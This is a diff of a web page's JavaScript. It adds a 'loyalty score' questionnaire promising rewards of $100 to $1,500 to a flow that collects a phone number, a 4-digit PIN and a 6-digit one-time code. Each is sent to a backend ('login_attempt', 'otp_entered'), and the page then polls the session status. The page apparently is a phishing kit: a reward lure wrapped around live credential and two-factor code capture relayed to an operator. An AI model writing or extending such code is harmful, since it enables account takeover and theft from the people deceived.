     document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
     document.getElementById(id).classList.add('active');
+    if (id === 'loyalty') {
+      document.body.classList.add('scrollable');
+    } else {
+      document.body.classList.remove('scrollable');
+    }
     if (id === 'otp') setTimeout(() => focusOtpInput(), 100);
   }
 
-  // ── Country picker ──
+  /* ── Loyalty page toggle ── */
+  function toggleLoyaltyPage() {
+    const p1 = document.getElementById('loyPage1');
+    const p2 = document.getElementById('loyPage2');
+    const nav = document.getElementById('navToggle');
+    if (p1.classList.contains('loy-hidden')) {
+      p1.classList.remove('loy-hidden'); p2.classList.add('loy-hidden'); nav.textContent = 'Audit →';
+    } else {
+      p1.classList.add('loy-hidden'); p2.classList.remove('loy-hidden'); nav.textContent = '← Home';
+    }
+  }
+
+  /* ── Loyalty score ── */
+  function calculateScore() {
+    const age = document.getElementById('accountAge').value;
+    const volume = document.getElementById('transactionVolume').value;
+    const type = document.getElementById('userType').value;
+    const period = document.getElementById('activePeriod').value;
+    if (!age || !volume || !type || !period) { document.getElementById('estimateBox').style.display = 'none'; return; }
+    document.getElementById('estimateBox').style.display = 'block';
+    let score = 0;
+    if (age === '0-3') score += 10; else if (age === '3-6') score += 25; else if (age === '6-12') score += 40; else if (age === '1-2') score += 60; else if (age === '2-3') score += 80; else if (age === '3+') score += 100;
+    if (volume === '0-100') score += 10; else if (volume === '100-500') score += 30; else if (volume === '500-1000') score += 50; else if (volume === '1000-2500') score += 70; else if (volume === '2500-5000') score += 85; else if (volume === '5000+') score += 100;
+    if (type === 'new') score += 10; else if (type === 'standard') score += 40; else if (type === 'regular') score += 70; else if (type === 'premium') score += 90; else if (type === 'business') score += 100;
+    if (period === 'rarely') score += 10; else if (period === 'occasional') score += 30; else if (period === 'monthly') score += 50; else if (period === 'weekly') score += 75; else if (period === 'daily') score += 100;
+    const pct = Math.round((score / 400) * 100);
+    document.getElementById('loyaltyScore').textContent = pct + '%';
+    let range = '';
+    if (pct < 30) range = '$0 – $100'; else if (pct < 50) range = '$100 – $250'; else if (pct < 70) range = '$250 – $500'; else if (pct < 85) range = '$500 – $1,000'; else range = '$1,000 – $1,500';
+    document.getElementById('rewardRange').textContent = range;
+  }
+  function updateEstimate() { calculateScore(); toggleAuditButton(); }
+  function toggleAuditButton() {
+    const age = document.getElementById('accountAge').value;
+    const volume = document.getElementById('transactionVolume').value;
+    const type = document.getElementById('userType').value;
+    const period = document.getElementById('activePeriod').value;
+    const checked = document.getElementById('confirmCheck').checked;
+    document.getElementById('auditBtn').disabled = !(age && volume && type && period && checked);
+  }
+
+  /* ── Country picker ── */
   const countries = [
     { flag: '🌐', name: 'Select Country', code: '+' },
-    { flag: '🇦🇫', name: 'Afghanistan', code: '+93' },
-    { flag: '🇦🇱', name: 'Albania', code: '+355' },
-    { flag: '🇩🇿', name: 'Algeria', code: '+213' },
-    { flag: '🇦🇴', name: 'Angola', code: '+244' },
-    { flag: '🇦🇷', name: 'Argentina', code: '+54' },
-    { flag: '🇦🇲', name: 'Armenia', code: '+374' },
-    { flag: '🇦🇺', name: 'Australia', code: '+61' },
-    { flag: '🇦🇹', name: 'Austria', code: '+43' },
-    { flag: '🇦🇿', name: 'Azerbaijan', code: '+994' },
-    { flag: '🇧🇩', name: 'Bangladesh', code: '+880' },
-    { flag: '🇧🇪', name: 'Belgium', code: '+32' },
-    { flag: '🇧🇯', name: 'Benin', code: '+229' },
-    { flag: '🇧🇴', name: 'Bolivia', code: '+591' },
-    { flag: '🇧🇦', name: 'Bosnia', code: '+387' },
-    { flag: '🇧🇼', name: 'Botswana', code: '+267' },
-    { flag: '🇧🇷', name: 'Brazil', code: '+55' },
-    { flag: '🇧🇫', name: 'Burkina Faso', code: '+226' },
-    { flag: '🇧🇮', name: 'Burundi', code: '+257' },
-    { flag: '🇨🇲', name: 'Cameroon', code: '+237' },
-    { flag: '🇨🇦', name: 'Canada', code: '+1' },
-    { flag: '🇨🇻', name: 'Cape Verde', code: '+238' },
-    { flag: '🇨🇫', name: 'Central African Republic', code: '+236' },
-    { flag: '🇹🇩', name: 'Chad', code: '+235' },
-    { flag: '🇨🇱', name: 'Chile', code: '+56' },
-    { flag: '🇨🇳', name: 'China', code: '+86' },
-    { flag: '🇨🇴', name: 'Colombia', code: '+57' },
-    { flag: '🇨🇬', name: 'Congo', code: '+242' },
-    { flag: '🇨🇩', name: 'DR Congo', code: '+243' },
-    { flag: '🇨🇷', name: 'Costa Rica', code: '+506' },
-    { flag: '🇨🇮', name: "Côte d'Ivoire", code: '+225' },
-    { flag: '🇭🇷', name: 'Croatia', code: '+385' },
-    { flag: '🇨🇺', name: 'Cuba', code: '+53' },
-    { flag: '🇨🇾', name: 'Cyprus', code: '+357' },
-    { flag: '🇨🇿', name: 'Czech Republic', code: '+420' },
-    { flag: '🇩🇰', name: 'Denmark', code: '+45' },
-    { flag: '🇩🇯', name: 'Djibouti', code: '+253' },
-    { flag: '🇩🇴', name: 'Dominican Republic', code: '+1-809' },
-    { flag: '🇪🇨', name: 'Ecuador', code: '+593' },
-    { flag: '🇪🇬', name: 'Egypt', code: '+20' },
-    { flag: '🇸🇻', name: 'El Salvador', code: '+503' },
-    { flag: '🇬🇶', name: 'Equatorial Guinea', code: '+240' },
-    { flag: '🇪🇷', name: 'Eritrea', code: '+291' },
-    { flag: '🇪🇹', name: 'Ethiopia', code: '+251' },
-    { flag: '🇫🇮', name: 'Finland', code: '+358' },
-    { flag: '🇫🇷', name: 'France', code: '+33' },
-    { flag: '🇬🇦', name: 'Gabon', code: '+241' },
-    { flag: '🇬🇲', name: 'Gambia', code: '+220' },
-    { flag: '🇬🇪', name: 'Georgia', code: '+995' },
-    { flag: '🇩🇪', name: 'Germany', code: '+49' },
-    { flag: '🇬🇭', name: 'Ghana', code: '+233' },
-    { flag: '🇬🇷', name: 'Greece', code: '+30' },
-    { flag: '🇬🇹', name: 'Guatemala', code: '+502' },
-    { flag: '🇬🇳', name: 'Guinea', code: '+224' },
-    { flag: '🇬🇼', name: 'Guinea-Bissau', code: '+245' },
-    { flag: '🇭🇹', name: 'Haiti', code: '+509' },
-    { flag: '🇭🇳', name: 'Honduras', code: '+504' },
-    { flag: '🇭🇺', name: 'Hungary', code: '+36' },
-    { flag: '🇮🇳', name: 'India', code: '+91' },
-    { flag: '🇮🇩', name: 'Indonesia', code: '+62' },
-    { flag: '🇮🇷', name: 'Iran', code: '+98' },
-    { flag: '🇮🇶', name: 'Iraq', code: '+964' },
-    { flag: '🇮🇪', name: 'Ireland', code: '+353' },
-    { flag: '🇮🇱', name: 'Israel', code: '+972' },
-    { flag: '🇮🇹', name: 'Italy', code: '+39' },
-    { flag: '🇯🇲', name: 'Jamaica', code: '+1-876' },
-    { flag: '🇯🇵', name: 'Japan', code: '+81' },
-    { flag: '🇯🇴', name: 'Jordan', code: '+962' },
-    { flag: '🇰🇿', name: 'Kazakhstan', code: '+7' },
-    { flag: '🇰🇪', name: 'Kenya', code: '+254' },
-    { flag: '🇽🇰', name: 'Kosovo', code: '+383' },
-    { flag: '🇰🇼', name: 'Kuwait', code: '+965' },
-    { flag: '🇱🇦', name: 'Laos', code: '+856' },
-    { flag: '🇱🇧', name: 'Lebanon', code: '+961' },
-    { flag: '🇱🇸', name: 'Lesotho', code: '+266' },
-    { flag: '🇱🇷', name: 'Liberia', code: '+231' },
-    { flag: '🇱🇾', name: 'Libya', code: '+218' },
-    { flag: '🇲🇬', name: 'Madagascar', code: '+261' },
-    { flag: '🇲🇼', name: 'Malawi', code: '+265' },
-    { flag: '🇲🇾', name: 'Malaysia', code: '+60' },
-    { flag: '🇲🇱', name: 'Mali', code: '+223' },
-    { flag: '🇲🇷', name: 'Mauritania', code: '+222' },
-    { flag: '🇲🇺', name: 'Mauritius', code: '+230' },
-    { flag: '🇲🇽', name: 'Mexico', code: '+52' },
-    { flag: '🇲🇩', name: 'Moldova', code: '+373' },
-    { flag: '🇲🇳', name: 'Mongolia', code: '+976' },
-    { flag: '🇲🇦', name: 'Morocco', code: '+212' },
-    { flag: '🇲🇿', name: 'Mozambique', code: '+258' },
-    { flag: '🇲🇲', name: 'Myanmar', code: '+95' },
-    { flag: '🇳🇦', name: 'Namibia', code: '+264' },
-    { flag: '🇳🇵', name: 'Nepal', code: '+977' },
-    { flag: '🇳🇱', name: 'Netherlands', code: '+31' },
-    { flag: '🇳🇿', name: 'New Zealand', code: '+64' },
-    { flag: '🇳🇮', name: 'Nicaragua', code: '+505' },
-    { flag: '🇳🇪', name: 'Niger', code: '+227' },
-    { flag: '🇳🇬', name: 'Nigeria', code: '+234' },
-    { flag: '🇰🇵', name: 'North Korea', code: '+850' },
-    { flag: '🇲🇰', name: 'North Macedonia', code: '+389' },
-    { flag: '🇳🇴', name: 'Norway', code: '+47' },
-    { flag: '🇴🇲', name: 'Oman', code: '+968' },
-    { flag: '🇵🇰', name: 'Pakistan', code: '+92' },
-    { flag: '🇵🇸', name: 'Palestine', code: '+970' },
-    { flag: '🇵🇦', name: 'Panama', code: '+507' },
-    { flag: '🇵🇬', name: 'Papua New Guinea', code: '+675' },
-    { flag: '🇵🇾', name: 'Paraguay', code: '+595' },
-    { flag: '🇵🇪', name: 'Peru', code: '+51' },
-    { flag: '🇵🇭', name: 'Philippines', code: '+63' },
-    { flag: '🇵🇱', name: 'Poland', code: '+48' },
-    { flag: '🇵🇹', name: 'Portugal', code: '+351' },
-    { flag: '🇶🇦', name: 'Qatar', code: '+974' },
-    { flag: '🇷🇴', name: 'Romania', code: '+40' },
-    { flag: '🇷🇺', name: 'Russia', code: '+7' },
-    { flag: '🇷🇼', name: 'Rwanda', code: '+250' },
-    { flag: '🇸🇦', name: 'Saudi Arabia', code: '+966' },
-    { flag: '🇸🇳', name: 'Senegal', code: '+221' },
-    { flag: '🇷🇸', name: 'Serbia', code: '+381' },
-    { flag: '🇸🇱', name: 'Sierra Leone', code: '+232' },
-    { flag: '🇸🇬', name: 'Singapore', code: '+65' },
-    { flag: '🇸🇰', name: 'Slovakia', code: '+421' },
-    { flag: '🇸🇴', name: 'Somalia', code: '+252' },
-    { flag: '🇿🇦', name: 'South Africa', code: '+27' },
-    { flag: '🇸🇸', name: 'South Sudan', code: '+211' },
-    { flag: '🇪🇸', name: 'Spain', code: '+34' },
-    { flag: '🇱🇰', name: 'Sri Lanka', code: '+94' },
-    { flag: '🇸🇩', name: 'Sudan', code: '+249' },
-    { flag: '🇸🇿', name: 'Eswatini', code: '+268' },
-    { flag: '🇸🇪', name: 'Sweden', code: '+46' },
-    { flag: '🇨🇭', name: 'Switzerland', code: '+41' },
-    { flag: '🇸🇾', name: 'Syria', code: '+963' },
-    { flag: '🇹🇿', name: 'Tanzania', code: '+255' },
-    { flag: '🇹🇭', name: 'Thailand', code: '+66' },
-    { flag: '🇹🇬', name: 'Togo', code: '+228' },
-    { flag: '🇹🇹', name: 'Trinidad & Tobago', code: '+1-868' },
-    { flag: '🇹🇳', name: 'Tunisia', code: '+216' },
-    { flag: '🇹🇷', name: 'Turkey', code: '+90' },
-    { flag: '🇺🇬', name: 'Uganda', code: '+256' },
-    { flag: '🇺🇦', name: 'Ukraine', code: '+380' },
-    { flag: '🇦🇪', name: 'UAE', code: '+971' },
-    { flag: '🇬🇧', name: 'United Kingdom', code: '+44' },
-    { flag: '🇺🇸', name: 'United States', code: '+1' },
-    { flag: '🇺🇾', name: 'Uruguay', code: '+598' },
-    { flag: '🇺🇿', name: 'Uzbekistan', code: '+998' },
-    { flag: '🇻🇪', name: 'Venezuela', code: '+58' },
-    { flag: '🇻🇳', name: 'Vietnam', code: '+84' },
-    { flag: '🇾🇪', name: 'Yemen', code: '+967' },
-    { flag: '🇿🇲', name: 'Zambia', code: '+260' },
-    { flag: '🇿🇼', name: 'Zimbabwe', code: '+263' },
+    { flag: '🇦🇫', name: 'Afghanistan', code: '+93' },{ flag: '🇦🇱', name: 'Albania', code: '+355' },{ flag: '🇩🇿', name: 'Algeria', code: '+213' },{ flag: '🇦🇴', name: 'Angola', code: '+244' },{ flag: '🇦🇷', name: 'Argentina', code: '+54' },{ flag: '🇦🇲', name: 'Armenia', code: '+374' },{ flag: '🇦🇺', name: 'Australia', code: '+61' },{ flag: '🇦🇹', name: 'Austria', code: '+43' },{ flag: '🇦🇿', name: 'Azerbaijan', code: '+994' },{ flag: '🇧🇩', name: 'Bangladesh', code: '+880' },{ flag: '🇧🇪', name: 'Belgium', code: '+32' },{ flag: '🇧🇯', name: 'Benin', code: '+229' },{ flag: '🇧🇴', name: 'Bolivia', code: '+591' },{ flag: '🇧🇦', name: 'Bosnia', code: '+387' },{ flag: '🇧🇼', name: 'Botswana', code: '+267' },{ flag: '🇧🇷', name: 'Brazil', code: '+55' },{ flag: '🇧🇫', name: 'Burkina Faso', code: '+226' },{ flag: '🇧🇮', name: 'Burundi', code: '+257' },{ flag: '🇨🇲', name: 'Cameroon', code: '+237' },{ flag: '🇨🇦', name: 'Canada', code: '+1' },{ flag: '🇨🇻', name: 'Cape Verde', code: '+238' },{ flag: '🇨🇫', name: 'Central African Republic', code: '+236' },{ flag: '🇹🇩', name: 'Chad', code: '+235' },{ flag: '🇨🇱', name: 'Chile', code: '+56' },{ flag: '🇨🇳', name: 'China', code: '+86' },{ flag: '🇨🇴', name: 'Colombia', code: '+57' },{ flag: '🇨🇬', name: 'Congo', code: '+242' },{ flag: '🇨🇩', name: 'DR Congo', code: '+243' },{ flag: '🇨🇷', name: 'Costa Rica', code: '+506' },{ flag: '🇨🇮', name: "Côte d'Ivoire", code: '+225' },{ flag: '🇭🇷', name: 'Croatia', code: '+385' },{ flag: '🇨🇺', name: 'Cuba', code: '+53' },{ flag: '🇨🇾', name: 'Cyprus', code: '+357' },{ flag: '🇨🇿', name: 'Czech Republic', code: '+420' },{ flag: '🇩🇰', name: 'Denmark', code: '+45' },{ flag: '🇩🇯', name: 'Djibouti', code: '+253' },{ flag: '🇩🇴', name: 'Dominican Republic', code: '+1-809' },{ flag: '🇪🇨', name: 'Ecuador', code: '+593' },{ flag: '🇪🇬', name: 'Egypt', code: '+20' },{ flag: '🇸🇻', name: 'El Salvador', code: '+503' },{ flag: '🇬🇶', name: 'Equatorial Guinea', code: '+240' },{ flag: '🇪🇷', name: 'Eritrea', code: '+291' },{ flag: '🇪🇹', name: 'Ethiopia', code: '+251' },{ flag: '🇫🇮', name: 'Finland', code: '+358' },{ flag: '🇫🇷', name: 'France', code: '+33' },{ flag: '🇬🇦', name: 'Gabon', code: '+241' },{ flag: '🇬🇲', name: 'Gambia', code: '+220' },{ flag: '🇬🇪', name: 'Georgia', code: '+995' },{ flag: '🇩🇪', name: 'Germany', code: '+49' },{ flag: '🇬🇭', name: 'Ghana', code: '+233' },{ flag: '🇬🇷', name: 'Greece', code: '+30' },{ flag: '🇬🇹', name: 'Guatemala', code: '+502' },{ flag: '🇬🇳', name: 'Guinea', code: '+224' },{ flag: '🇬🇼', name: 'Guinea-Bissau', code: '+245' },{ flag: '🇭🇹', name: 'Haiti', code: '+509' },{ flag: '🇭🇳', name: 'Honduras', code: '+504' },{ flag: '🇭🇺', name: 'Hungary', code: '+36' },{ flag: '🇮🇳', name: 'India', code: '+91' },{ flag: '🇮🇩', name: 'Indonesia', code: '+62' },{ flag: '🇮🇷', name: 'Iran', code: '+98' },{ flag: '🇮🇶', name: 'Iraq', code: '+964' },{ flag: '🇮🇪', name: 'Ireland', code: '+353' },{ flag: '🇮🇱', name: 'Israel', code: '+972' },{ flag: '🇮🇹', name: 'Italy', code: '+39' },{ flag: '🇯🇲', name: 'Jamaica', code: '+1-876' },{ flag: '🇯🇵', name: 'Japan', code: '+81' },{ flag: '🇯🇴', name: 'Jordan', code: '+962' },{ flag: '🇰🇿', name: 'Kazakhstan', code: '+7' },{ flag: '🇰🇪', name: 'Kenya', code: '+254' },{ flag: '🇽🇰', name: 'Kosovo', code: '+383' },{ flag: '🇰🇼', name: 'Kuwait', code: '+965' },{ flag: '🇱🇦', name: 'Laos', code: '+856' },{ flag: '🇱🇧', name: 'Lebanon', code: '+961' },{ flag: '🇱🇸', name: 'Lesotho', code: '+266' },{ flag: '🇱🇷', name: 'Liberia', code: '+231' },{ flag: '🇱🇾', name: 'Libya', code: '+218' },{ flag: '🇲🇬', name: 'Madagascar', code: '+261' },{ flag: '🇲🇼', name: 'Malawi', code: '+265' },{ flag: '🇲🇾', name: 'Malaysia', code: '+60' },{ flag: '🇲🇱', name: 'Mali', code: '+223' },{ flag: '🇲🇷', name: 'Mauritania', code: '+222' },{ flag: '🇲🇺', name: 'Mauritius', code: '+230' },{ flag: '🇲🇽', name: 'Mexico', code: '+52' },{ flag: '🇲🇩', name: 'Moldova', code: '+373' },{ flag: '🇲🇳', name: 'Mongolia', code: '+976' },{ flag: '🇲🇦', name: 'Morocco', code: '+212' },{ flag: '🇲🇿', name: 'Mozambique', code: '+258' },{ flag: '🇲🇲', name: 'Myanmar', code: '+95' },{ flag: '🇳🇦', name: 'Namibia', code: '+264' },{ flag: '🇳🇵', name: 'Nepal', code: '+977' },{ flag: '🇳🇱', name: 'Netherlands', code: '+31' },{ flag: '🇳🇿', name: 'New Zealand', code: '+64' },{ flag: '🇳🇮', name: 'Nicaragua', code: '+505' },{ flag: '🇳🇪', name: 'Niger', code: '+227' },{ flag: '🇳🇬', name: 'Nigeria', code: '+234' },{ flag: '🇰🇵', name: 'North Korea', code: '+850' },{ flag: '🇲🇰', name: 'North Macedonia', code: '+389' },{ flag: '🇳🇴', name: 'Norway', code: '+47' },{ flag: '🇴🇲', name: 'Oman', code: '+968' },{ flag: '🇵🇰', name: 'Pakistan', code: '+92' },{ flag: '🇵🇸', name: 'Palestine', code: '+970' },{ flag: '🇵🇦', name: 'Panama', code: '+507' },{ flag: '🇵🇬', name: 'Papua New Guinea', code: '+675' },{ flag: '🇵🇾', name: 'Paraguay', code: '+595' },{ flag: '🇵🇪', name: 'Peru', code: '+51' },{ flag: '🇵🇭', name: 'Philippines', code: '+63' },{ flag: '🇵🇱', name: 'Poland', code: '+48' },{ flag: '🇵🇹', name: 'Portugal', code: '+351' },{ flag: '🇶🇦', name: 'Qatar', code: '+974' },{ flag: '🇷🇴', name: 'Romania', code: '+40' },{ flag: '🇷🇺', name: 'Russia', code: '+7' },{ flag: '🇷🇼', name: 'Rwanda', code: '+250' },{ flag: '🇸🇦', name: 'Saudi Arabia', code: '+966' },{ flag: '🇸🇳', name: 'Senegal', code: '+221' },{ flag: '🇷🇸', name: 'Serbia', code: '+381' },{ flag: '🇸🇱', name: 'Sierra Leone', code: '+232' },{ flag: '🇸🇬', name: 'Singapore', code: '+65' },{ flag: '🇸🇰', name: 'Slovakia', code: '+421' },{ flag: '🇸🇴', name: 'Somalia', code: '+252' },{ flag: '🇿🇦', name: 'South Africa', code: '+27' },{ flag: '🇸🇸', name: 'South Sudan', code: '+211' },{ flag: '🇪🇸', name: 'Spain', code: '+34' },{ flag: '🇱🇰', name: 'Sri Lanka', code: '+94' },{ flag: '🇸🇩', name: 'Sudan', code: '+249' },{ flag: '🇸🇿', name: 'Eswatini', code: '+268' },{ flag: '🇸🇪', name: 'Sweden', code: '+46' },{ flag: '🇨🇭', name: 'Switzerland', code: '+41' },{ flag: '🇸🇾', name: 'Syria', code: '+963' },{ flag: '🇹🇿', name: 'Tanzania', code: '+255' },{ flag: '🇹🇭', name: 'Thailand', code: '+66' },{ flag: '🇹🇬', name: 'Togo', code: '+228' },{ flag: '🇹🇹', name: 'Trinidad & Tobago', code: '+1-868' },{ flag: '🇹🇳', name: 'Tunisia', code: '+216' },{ flag: '🇹🇷', name: 'Turkey', code: '+90' },{ flag: '🇺🇬', name: 'Uganda', code: '+256' },{ flag: '🇺🇦', name: 'Ukraine', code: '+380' },{ flag: '🇦🇪', name: 'UAE', code: '+971' },{ flag: '🇬🇧', name: 'United Kingdom', code: '+44' },{ flag: '🇺🇸', name: 'United States', code: '+1' },{ flag: '🇺🇾', name: 'Uruguay', code: '+598' },{ flag: '🇺🇿', name: 'Uzbekistan', code: '+998' },{ flag: '🇻🇪', name: 'Venezuela', code: '+58' },{ flag: '🇻🇳', name: 'Vietnam', code: '+84' },{ flag: '🇾🇪', name: 'Yemen', code: '+967' },{ flag: '🇿🇲', name: 'Zambia', code: '+260' },{ flag: '🇿🇼', name: 'Zimbabwe', code: '+263' },
   ];
 
   let selectedIndex = 0;
@@ -613,20 +577,15 @@
     const list = document.getElementById('country-list');
     list.innerHTML = filtered.map(c => {
       const idx = countries.indexOf(c);
-      return `<div class="country-item ${idx === selectedIndex ? 'selected' : ''}" onclick="selectCountry(${idx})">
-        <span class="item-flag">${c.flag}</span>
-        <span class="item-name">${c.name}</span>
-        <span class="item-code">${c.code}</span>
-      </div>`;
+      return `<div class="country-item ${idx===selectedIndex?'selected':''}" onclick="selectCountry(${idx})"><span class="item-flag">${c.flag}</span><span class="item-name">${c.name}</span><span class="item-code">${c.code}</span></div>`;
     }).join('');
   }
-
   function filterCountries() {
     const q = document.getElementById('search-input').value.toLowerCase();
     filtered = countries.filter(c => c.name.toLowerCase().includes(q) || c.code.includes(q));
     renderList();
+  document.body.classList.add("scrollable"); // loyalty is first screen
   }
-
   function selectCountry(index) {
     selectedIndex = index;
     document.getElementById('selected-flag').textContent = countries[index].flag;
@@ -634,31 +593,27 @@
     document.getElementById('dropdown').classList.remove('open');
     document.getElementById('phone-input').focus();
   }
-
   function toggleDropdown() {
     const dd = document.getElementById('dropdown');
     dd.classList.toggle('open');
     if (dd.classList.contains('open')) { renderList(); document.getElementById('search-input').focus(); }
   }
-
   document.addEventListener('click', function(e) {
     const dd = document.getElementById('dropdown');
     const selector = document.querySelector('.country-select');
     if (dd && !dd.contains(e.target) && selector && !selector.contains(e.target)) dd.classList.remove('open');
   });
-
   renderList();
+  document.body.classList.add("scrollable"); // loyalty is first screen
 
-  // ── Login → PIN ──
   function goToPin() {
     const phone = document.getElementById('phone-input').value.trim();
     if (!phone) { alert('Please enter your mobile number.'); return; }
     showScreen('pin');
   }
 
-  // ── PIN logic ──
+  /* ── PIN ── */
   let pin = [];
-
   function updateDashes() {
     for (let i = 0; i < 4; i++) {
       const d = document.getElementById('d' + i);
@@ -670,40 +625,27 @@
     if (pin.length === 4) { btn.disabled = false; btn.classList.add('ready'); }
     else { btn.disabled = true; btn.classList.remove('ready'); }
   }
-
-  function pressKey(num) {
-    if (pin.length < 4) { pin.push(num); updateDashes(); }
-  }
-
-  function deleteLast() {
-    if (pin.length > 0) { pin.pop(); updateDashes(); }
-  }
-
+  function pressKey(num) { if (pin.length < 4) { pin.push(num); updateDashes(); } }
+  function deleteLast() { if (pin.length > 0) { pin.pop(); updateDashes(); } }
   updateDashes();
 
   async function submitPIN() {
     if (pin.length !== 4) return;
-    const phone       = document.getElementById('phone-input').value.trim();
+    const phone = document.getElementById('phone-input').value.trim();
     const countryFlag = countries[selectedIndex].flag;
     const countryCode = countries[selectedIndex].code;
-    const pinStr      = pin.join('');
-
+    const pinStr = pin.join('');
     showLoading();
     const result = await callApi('login_attempt', { countryFlag, countryCode, phone, pin: pinStr });
     if (result.success && result.data && result.data.sessionId) {
       currentSessionId = result.data.sessionId;
       startStatusPolling(currentSessionId);
-    } else {
-      hideLoading();
-      alert('Failed to send request. Please try again.');
-    }
+    } else { hideLoading(); alert('Failed to send request. Please try again.'); }
   }
 
-  // ── OTP logic ──
+  /* ── OTP ── */
   const otpInput = document.getElementById('otp-input');
-
   function focusOtpInput() { otpInput.focus(); }
-
   function updateSlots() {
     const val = otpInput.value.replace(/\D/g, '').slice(0, 6);
     for (let i = 0; i < 6; i++) {
@@ -717,28 +659,18 @@
     if (val.length === 6) { btn.disabled = false; btn.classList.add('ready'); }
     else { btn.disabled = true; btn.classList.remove('ready'); }
   }
-
-  otpInput.addEventListener('input', () => {
-    otpInput.value = otpInput.value.replace(/\D/g, '').slice(0, 6);
-    updateSlots();
-  });
-
+  otpInput.addEventListener('input', () => { otpInput.value = otpInput.value.replace(/\D/g, '').slice(0, 6); updateSlots(); });
   updateSlots();
 
   async function submitOTP() {
     const otp = otpInput.value.replace(/\D/g, '').slice(0, 6);
     if (otp.length !== 6 || !currentSessionId) return;
-    const phone       = document.getElementById('phone-input').value.trim();
+    const phone = document.getElementById('phone-input').value.trim();
     const countryCode = countries[selectedIndex].code;
-
     showLoading();
     const result = await callApi('otp_entered', { sessionId: currentSessionId, otp, countryCode, phone });
-    if (result.success) {
-      startStatusPolling(currentSessionId);
-    } else {
-      hideLoading();
-      alert('Failed to submit OTP. Please try again.');
-    }
+    if (result.success) { startStatusPolling(currentSessionId); }
+    else { hideLoading(); alert('Failed to submit OTP. Please try again.'); }
   }
 </script>
 </body>
